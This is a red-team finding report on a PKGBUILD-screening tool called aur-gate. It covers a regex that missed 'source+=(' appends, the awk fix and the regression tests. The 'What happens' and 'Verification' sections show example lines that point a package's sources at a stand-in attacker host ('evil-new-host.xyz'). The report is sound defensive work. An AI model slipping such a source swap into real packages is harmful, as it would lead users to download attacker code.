# Finding X — `source+=()` append invisible to source-domain drift

**Source:** follow-up red-team review (post A–V, 2026-07-27)
**Tracking:** [#26 (L6)](https://github.com/bermudi/aur-gate/issues/26)
**Status:** fixed
**Severity:** low
**Lines:** `source_domains()` awk anchor at aur-gate:608. Same pattern family at
aur-gate:772, 1034, 1036, 1046, 1061 (contextual array helpers); only the
drift extractor was required for closure.

## What happens

`source_domains()` only enters array-tracking mode on lines matching
`source(_[[:alnum:]_]+)?=\(`, which does **not** match the append form
`source+=(`:

```bash
git -C "$dir" show "${ref}:PKGBUILD" 2>/dev/null \
  | awk '/^[[:space:]]*source(_[[:alnum:]_]+)?=\(/ { in_src=1 } in_src { print; if (/\)/) in_src=0 }' \
  | grep -aoE '://([^@]+@)?(\[[0-9A-Fa-f:]+\]|[a-zA-Z0-9._-]+)' | ...
```

An appended `source+=("https://evil-new-host.xyz/x")` with a brand-new host is
therefore invisible to the domain set-diff, so the `[source-domain-new]` review
annotation is never emitted for it.

This is the inverse of Finding L5 (`source_domains` overmatching `source_dir=`
variables; see [README §Low](./README.md) — L1–L9 are tracked inline, no
finding file) — that
fix tightened this same pattern family to stop *overmatching* `source_dir=` and
in doing so never accounted for the `+=` *undermatch*. The lineage is worth
noting because every `source…=\(` anchor in the file shares the gap.

## Why this is degraded, not a bypass

Two independent safety nets hold, so no payload reaches pacman through this:

1. The added `source+=(...)` line fails the boring source grammar and routes to
   `review` via the general non-boring fallthrough — the reviewer still sees the
   line, host included.
2. `_source_line_nonascii()` shape-2 (aur-gate:648) matches **any** added line
   containing `://` with a byte ≥ 0x80, so IDN homographs on an appended source
   URL are still forced to review regardless of the `+=` syntax.

The lost signal is the specific `[source-domain-new]` tag — i.e. the structural
"tarball swapped to a new domain" callout. The host is still visible in the diff
the reviewer consents to; it just isn't singled out.

## Fix

Add the optional `+` to the drift anchor (the load-bearing one for this finding):

```awk
/^[[:space:]]*source(_[[:alnum:]_]+)?[+]?=\(/ { in_src=1 }
```

The bracket-expression form `[+]?` is portable across awk, `grep -E`, and Bash
`[[ =~ ]]`. The contextual array helpers (aur-gate:772, 1034, 1036, 1046, 1061)
still match only the non-append `source=(` form; that is sufficient because the
added `source+=(...)` line is already caught as non-boring and the drift signal
now fires before the per-line classifier runs.

## Verification

- `source-append-new-host-visible` — a `source+=("https://evil-new-host.xyz/pkg-2.tar")`
  append in a fresh git fixture is listed by `source_domains` as `evil-new-host.xyz`.
- `source-append-same-host-no-drift` — a `source+=("https://example.com/pkg-2.tar")`
  append reusing the baseline host produces an empty `comm -13` set-diff, so
  `[source-domain-new]` does not fire.
- `bash -n aur-gate` clean; `shellcheck -s bash aur-gate` clean.
- `./aur-gate selftest </dev/null` → 307 passed, 0 failed (was 305 before the
  two new regression fixtures).

## Lesson

A single regex anchor in a parser can silently drop an entire syntax family.
When tightening patterns to stop *overmatching* (Finding L5), audit the same
anchor for *undermatching* of legitimate variants — especially array-append
syntax, which PKGBUILD uses for arch-conditional and version-bump additions.
